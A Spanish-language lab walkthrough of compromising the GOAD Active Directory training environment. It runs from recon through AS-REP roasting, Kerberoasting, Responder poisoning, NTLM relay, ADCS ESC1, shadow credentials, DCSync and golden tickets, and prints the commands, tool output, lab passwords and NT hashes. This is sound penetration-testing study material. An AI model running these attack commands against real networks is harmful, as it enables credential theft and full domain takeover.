## Recon
```bash
# verifica que el protocolo de smb ande corriendo en las maquinas
cme smb 192.168.56.1/24
# verifica los dominios disponibles
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```

##### Opcional
Como se estara trabajando con autenticacion de Kerberos, podemos configurar el cliente de kerberos en linux, esto se puede realizar con la informacion obtenida en los pasos anteriores:
```bash
# instalamos el cliente de kerberos
sudo apt install krb5-user
```
Agregamos la siguiente configuracion en el archivo `/etc/krb5.conf`:
![[Pasted image 20250304233601.png]]

Ahora procedemos a correr:
```
getTGT.py north.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!
```

Recibiremos un output como este:
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in eddard.stark.ccache
```

Esto genera un ticket para el usuario eddard.stark que podemos utilizar para llamar al DC01:
```bash
export KRB5CCNAME=$(pwd)/eddard.stark.ccache
smbclient.py -k @castelblack.north.sevenkingdoms.local
```

Con la consola de smbclient, podemos verificar que el share de C es accesible con:
```bash
use C$
ls
```

## Fase Inicial:

Scan de nmap inicial:
`nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23`

> Este scan ignora las no respuestas de ping con `Pn`, analiza todos los puertos con `-p-`, utiliza los scripts de reconomientos por default en `-sC`, enumera la version con `-sV`, y lanza los resultados de los scan en formato (ready para grep, xml y nmap clasico)

Enumeramos usuarios con:
```bash
netexec smb 192.168.56.10-22 --users
```

Tambien se puede hacer con herramientas locales con:
```bash
rpcclient -U "" -N 192.168.56.11 -c "enumdomusers"
```

Output esperado:
```bash
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]
```

![[Pasted image 20250309191040.png]]

Aqui encontramos el usuario de 

`samwell.tarly` que tiene una contraseña en la descripcion

`samwell.tarly`:`Heartsbane`

## ASRepRoasting
Ya que tenemos usuario , podemos enumerar acceso con netexec:
```bash
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
```

Luego de correrlo, vemos algo asi:
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:a11451699311c8235d1ac4eb666c76f6$8e8b378c25d8c643006b9a193fffa670a63fb62de5ad684b48f471764ab19c00dfc53c710c4382ba53950284c449a08f06a90dceec6f26cb13ea7198ce993b32e796939c0dafad131a05df0d58b978fd7d15e7fff597df4dbd30404d3a4e5adf852b6910c480136a87ac0420a54598f5f5092ed1b9c8f89812d7ca54e287aadf29e02e1ef598979eded92930827638c4162d3252e0890b7ab4cf23e04ed7e241b75d4bd35dcf4a645cee9853e17f1c7745fbe7652d14209b6a84fd388957e82b05fd7e5cc72f4661333433d5cf4900c335e4c0445ad8eec1ac63e2e125e6b1ec3ad5c4fca082bf8bcbbbaf89093f28a1044f296382e4627ef0a302974d15cd3c44c0c5723748
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Aqui vemos que recibimos un ticket del usuario brandon.stark. Luego de encontrar este ticket, podemos romperlo con:

```bash
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

Output:
```bash
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:a11451699311c8235d1ac4eb666c76f6$8e8b378c25d8c643006b9a193fffa670a63fb62de5ad684b48f471764ab19c00dfc53c710c4382ba53950284c449a08f06a90dceec6f26cb13ea7198ce993b32e796939c0dafad131a05df0d58b978fd7d15e7fff597df4dbd30404d3a4e5adf852b6910c480136a87ac0420a54598f5f5092ed1b9c8f89812d7ca54e287aadf29e02e1ef598979eded92930827638c4162d3252e0890b7ab4cf23e04ed7e241b75d4bd35dcf4a645cee9853e17f1c7745fbe7652d14209b6a84fd388957e82b05fd7e5cc72f4661333433d5cf4900c335e4c0445ad8eec1ac63e2e125e6b1ec3ad5c4fca082bf8bcbbbaf89093f28a1044f296382e4627ef0a302974d15cd3c44c0c5723748:iseedeadpeople
```

Conseguimos otro usuario, ahora el de `brandon.stark`:`iseedeadpeople`

Con esto obtenemos 2 usuarios con los cuales podemos seguir avanzando:
```bash
nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --pass-pol
```

	⚠️ Es bueno verificar la politica de contraseñas para evitar bloquear las cuentas.

```bash
nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --pass-pol
```


`samwell.tarly`:`Heartsbane`
`brandon.stark`:`iseedeadpeople`


## Fase Inicial + Usuario
Ya que tenemos el usuario de `brandon.stark`, podemos proceder a enumerar el AD, podemos obtener los usuarios del AD con el siguiente comando:
```bash
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

El output que obtenemos es:
```bash
[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2025-03-01 18:20:54.631392  2025-03-01 19:34:01.950541 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 07:39:16.765445  2025-03-01 19:42:03.591514 
krbtgt                                                2025-03-01 19:03:36.251647  <never>             
                                                      2025-03-01 19:13:37.010967  <never>             
arya.stark                                            2025-03-01 19:14:36.720728  <never>             
eddard.stark                                          2025-03-01 19:14:39.083433  2025-03-09 19:26:51.291784 
catelyn.stark                                         2025-03-01 19:14:41.236629  <never>             
robb.stark                                            2025-03-01 19:14:43.474163  2025-03-09 19:31:02.882361 
sansa.stark                                           2025-03-01 19:14:45.846326  <never>             
brandon.stark                                         2025-03-01 19:14:48.440147  2025-03-09 19:20:09.865870 
rickon.stark                                          2025-03-01 19:14:51.362459  <never>             
hodor                                                 2025-03-01 19:14:53.909495  <never>             
jon.snow                                              2025-03-01 19:14:56.253413  <never>             
samwell.tarly                                         2025-03-01 19:14:58.706649  <never>             
jeor.mormont                                          2025-03-01 19:15:01.113453  <never>             
sql_svc                                               2025-03-01 19:15:03.554363  2025-03-06 09:53:26.742389
```

En caso de no querer utilizar herramientas externas, podemos correr el siguiente comando:
```bash
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```

En el servidor de `sevenkingdoms.local`:
```bash
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | egrep distinguishedName
```

## Kerberoasting

Kerberoasting ataca los SPNs, para abusar de ellos podemos correr lo siguiente en Kali:
```bash
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

Ojo con este ataque:
	 While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access.

Aqui ya se tiene el hash, procedemos a tratar de crackearlo con:
```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -O
```

El output de esto es algo parecido a :
```bash
$krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$f93bbf31c897c510a6aa43342c2b5cb9$d442f1abf47dae3ceddbb6248704e5e434d687764df48c98a77f9387c58eb89a4a76790ac4[...]SNIP[...]997739b33c0950e762:iknownothing
```
Conseguimos un 3er usuario:
`jon.snow`:`iknownothing`

## Enumerando con BloodHound

BloodHound: https://github.com/SpecterOps/BloodHound-Legacy
Ingestor: https://github.com/dirkjanm/BloodHound.py

Para correr contra el dominio de `sevenkingdoms.local`
```bash
bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.10 -dc sevenkingdoms.local
```

Para correr contra el dominio de `north.sevenkingdoms.local`
```bash
bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.11 -dc north.sevenkingdoms.local
```


Abrimos neo4j con:
```bash
sudo neo4j console
```

Abrimos BloodHound e insertamos los archivos generados por Bloodhound:

![[Pasted image 20250309224401.png]]

Todos estos archivos `.json` pueden ser ingresados directamente a traves de arrastrar los archivos dentro del programa de BloodHound.

Aqui podemos correr los querys:

**Para ver los dominios:**
```bash
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
```
![[Pasted image 20250309225322.png]]

**Para ver todos los usuarios debajo de los dominios:**
```bash
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
```
![[Pasted image 20250309231209.png]]

**Ver los ACL de todos los usuarios**
```bash
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```
![[Pasted image 20250309231244.png]]
## LLMNR Poisoning
En nuestra maquina corremos el comando:
```bash
sudo responder -I <interfaz_conectada_a_la_red>
```

Verificamos que los servicios SMB y HTTP Empezaron:

Obtenemos un hash para el usuario `robb.stark`:
![[Pasted image 20250309235235.png]]

Copiamos el hash en un archivo, y ponemos en la consola de Kali:
```bash
hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
```

Tenemos la password del usuario `robb.stark`:
![[Pasted image 20250309235633.png]]
`sexywolfy`

Aqui tambien encontramos el usuario y el hash de `eddard.stark`, este no puede ser crackeado, pero puede ser abusado con ntlmrelayx:
```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Verificamos que el archivo generado solo tiene 1 servidor, que es el que contiene el MSSQL:
```bash
$ cat relay.txt                                                              
192.168.56.22
```

Ahora corremos el siguiente comando:
```bash
ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\\EDDARD.STARK@192.168.56.22 -smb2support -socks
```

Y empezamos el responder:
```bash
sudo responder -I tun1
```

Veremos en el output que tenemos una conexion a MSSQL como Admin:
![[Pasted image 20250310020145.png]]

Ahora podemos correr:
```bash
proxychains4 -q secretsdump.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

Y veremos que realizamos una secretsdump (dumpeamos todos los secretos del servidor) directamente en el SERVER01.


## ADCS - ESC1 
Instalamos Certipy, primero creamos un ambiente virtual de Python:
```bash
python3 -m venv .venv
```

Lo activamos con:
```bash
source ./.venv/bin/activate
```

Ahora procedemos a instalar Certipy con el comando:
```bash
pip install certipy-ad
```

Aqui corremos el comando de:
```bash
certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.56.10 -debug -vulnerable -stdout
```

Viendo que tenemos el template vulnerable, corremos el siguiente comando:
```bash
certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
```
El cual nos solicitara un ticket como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

Con el hash revelado, podemos proceder a correr secrets dump:
```bash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.56.10
```


## ACL Abusos

### GenericWrite
#### ShadowCredentials (windows server 2016 or +)

```bash
certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 'joffrey.baratheon'
```

Con esto se puede obtener un resultado como este:
```bash
certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 'joffrey.baratheon'                                                                             
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                              
                                                                                                                                                                                    
[*] Targeting user 'joffrey.baratheon'                                                                                                                                              
[*] Generating certificate                                                                                                                                                          
[*] Certificate generated                                                                                                                                                           
[*] Generating Key Credential                                                                                                                                                       
[*] Key Credential generated with DeviceID '34497e55-b72e-057a-11d3-be75cae43af8'                                                                                                   
[*] Adding Key Credential with device ID '34497e55-b72e-057a-11d3-be75cae43af8' to the Key Credentials for 'joffrey.baratheon'                                                      
[*] Successfully added Key Credential with device ID '34497e55-b72e-057a-11d3-be75cae43af8' to the Key Credentials for 'joffrey.baratheon'                                          
[*] Authenticating as 'joffrey.baratheon' with the certificate                                                                                                                      
[*] Using principal: joffrey.baratheon@sevenkingdoms.local                                                                                                                          
[*] Trying to get TGT...                                                                                                                                                            
[*] Got TGT                                                                                                                                                                         
[*] Saved credential cache to 'joffrey.baratheon.ccache'                                                                                                                            
[*] Trying to retrieve NT hash for 'joffrey.baratheon'                                                                                                                              
[*] Restoring the old Key Credentials for 'joffrey.baratheon'                                                                                                                       
[*] Successfully restored the old Key Credentials for 'joffrey.baratheon'                                                                                                           
[*] NT hash for 'joffrey.baratheon': 3b60abbc25770511334b3829866b08f1
```

Este hash obtenido podemos utilizarlo para lo siguiente:
```bash
nxc smb 192.168.56.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1  
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 (Guest)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 STATUS_LOGON_FAILURE 
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1
```

Aqui vemos a cuales maquinas el usuario de `joffrey.baratheon` tiene acceso.

### Abusando el permiso de `Lord.varys`
Utilizando los permisos de `Lord.varys`:
```bash
certipy shadow auto -u lord.varys@sevenkingdoms.local -p '_W1sper_$' -account 'administrator'
```

Recibimos un output parecido al anterior y con este hash, podemos proceder a pwnear el administrador de ambos dominios:
```bash
nxc winrm 192.168.56.10-23 -u Administrator -H c66d72021a2d4744409969a581a1705e  
WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
```

vemos que tenemos pwn del administrator.

### DCSync con Administrator
Ya que administrator puede realizar DCSync en SEVENKINGDOMS.LOCAL y NORTH.SEVENKINGDOMS.LOCAL, hagamos eso:
```bash
secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.10 -output sevenkingdoms-local.hashes
secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.11 -output north.sevenkingdoms.local-hashes
```

Ahora en nuestro directorio tenemos:
```bash
cat north.sevenkingdoms.local-hashes.ntds sevenkingdoms-local.hashes.ntds | uniq
```

El output sera algo como :
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb0fd2690e28e38b0021dc4c844d72d5:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
....
```

### GoldenTicket for Persistence (GG)

Ya que tenemos el admin, y sacamos el nthash del servicio de KRBTGT, que tiene poder para crear nthashes de cualquier tipo, y solo para probar, vamos a generar un ticket del usuario `robert.baratheon` :
```bash
ticketer.py -nthash c1802a1d08b57644a6a1a2ca0b57fbc6 -domain-sid S-1-5-21-1768168739-1086324585-3153665815 -domain SEVENKINGDOMS.LOCAL ROBERT.BARATHEON
```

Aqui generaremos un ticket con extension `.ccache`, el cual exportamos:
```bash
export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
```

Ahora podemos correr el siguiente comando para especificar a cual maquina conectarnos:
```bash
wmiexec.py -k -dc-ip 192.168.56.10 -target-ip 192.168.56.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
```